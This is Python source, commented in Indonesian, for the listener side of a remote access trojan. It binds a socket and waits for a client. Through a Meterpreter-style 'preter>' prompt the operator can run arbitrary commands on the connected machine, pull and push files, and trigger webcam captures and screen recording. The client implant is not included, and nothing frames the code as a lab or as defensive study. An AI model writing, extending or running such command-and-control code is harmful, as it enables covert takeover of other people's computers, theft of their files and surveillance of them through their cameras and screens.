import socket
import json
import os
import cv2

# Membuat socket dan menunggu koneksi dari klien
soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
soc.bind(('192.168.0.124', 8888))
soc.listen(2)

print("Menunggu koneksi...")

target, ip = soc.accept()
print(f"Terhubung ke {ip}")

def data_diterima():
    """Menerima data dari klien dengan penanganan JSON yang aman."""
    data = ''
    while True:
        try:
            chunk = target.recv(1024).decode()
            if not chunk:
                break  # Jika koneksi terputus
            data += chunk
            return json.loads(data)  # Memastikan data dalam format JSON
        except json.JSONDecodeError:
            continue  # Jika JSON belum lengkap, tunggu data berikutnya

def download_file(nama_file):
    """Mengunduh file dari klien."""
    try:
        target.sendall(json.dumps({"command": "download", "file": nama_file}).encode())
        with open(nama_file, "wb") as file:
            while True:
                data = target.recv(4096)
                if data == b"DONE":
                    break
                file.write(data)
        print(f"File {nama_file} berhasil diunduh.")
    except Exception as e:
        print(f"Error saat mengunduh file: {str(e)}")

def upload_file(nama_file):
    """Mengunggah file ke klien."""
    try:
        if not os.path.exists(nama_file):
            print(f"File {nama_file} tidak ditemukan.")
            return
        target.sendall(json.dumps({"command": "upload", "file": nama_file}).encode())
        with open(nama_file, "rb") as file:
            while chunk := file.read(4096):
                target.sendall(chunk)
        target.sendall(b"DONE")
        print(f"File {nama_file} berhasil dikirim.")
    except Exception as e:
        print(f"Error saat mengunggah file: {str(e)}")


def komunikasi_shell():
    """Mengirim perintah ke klien dan menerima hasilnya."""
    while True:
        perintah = input("preter> ")
        
        if perintah.lower() in ["exit", "quit"]:
            print("Menutup koneksi...")
            target.sendall(json.dumps({"command": "exit"}).encode())
            target.close()
            soc.close()
            break

        elif perintah.startswith("download "):
            file_name = perintah.split(" ", 1)[1]
            download_file(file_name)
        
        elif perintah.startswith("upload "):
            file_name = perintah.split(" ", 1)[1]
            upload_file(file_name)

        elif perintah == "kamera":
            target.sendall(json.dumps({"command": "kamera"}).encode())
            hasil = data_diterima()
            print(hasil)
        
        elif perintah == "screen_record":
            target.sendall(json.dumps({"command": "screen_record"}).encode())
            hasil = data_diterima()
            print(hasil)
         

        else:
            try:
                target.sendall(json.dumps({"command": "execute", "cmd": perintah}).encode())
                hasil = data_diterima()
                print(hasil)
            except Exception as e:
                print(f"Error: {str(e)}")
                break

# Menjalankan komunikasi shell
komunikasi_shell()
